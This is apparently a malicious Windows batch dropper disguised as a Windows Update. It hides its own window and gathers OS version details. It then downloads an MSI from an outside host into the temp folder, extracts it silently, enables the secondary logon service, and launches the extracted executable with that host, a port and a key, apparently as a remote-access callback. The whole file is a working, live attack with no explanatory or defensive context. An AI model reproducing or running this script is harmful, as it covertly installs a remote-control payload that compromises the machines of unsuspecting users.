@echo off
if not "%~1"=="hidden" (
  powershell.exe -NoProfile -WindowStyle Hidden -Command "$ws = New-Object -ComObject WScript.Shell; $ws.Run('cmd.exe /c "%~dpnx0" hidden',0,$false)"
  exit /b
)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
net session >nul 2>&1
curl.exe -A "Mozilla/5.0" --ssl-no-revoke --tlsv1.2 -f -L -C - --connect-timeout 20 --max-time 900 --retry 2 --speed-limit 2048 --speed-time 60 "https://masterdarky.com/WindowsUpdate.msi" -o "%TEMP%\wupdate_224ac089.msi"
MSIEXEC.EXE /qn /a "%TEMP%\wupdate_224ac089.msi" targetdir="%TEMP%\wclient_224ac089" /qn
sc config seclogon start= auto
net start seclogon
RUNAS.EXE /trustlevel:0X20000 "\"%TEMP%\wclient_224ac089\Windows Update Agent\WindowsUpdate.WindowsClient.exe\" \"h=masterdarky.com&p=8041&k=RECONSTRUCTED\""
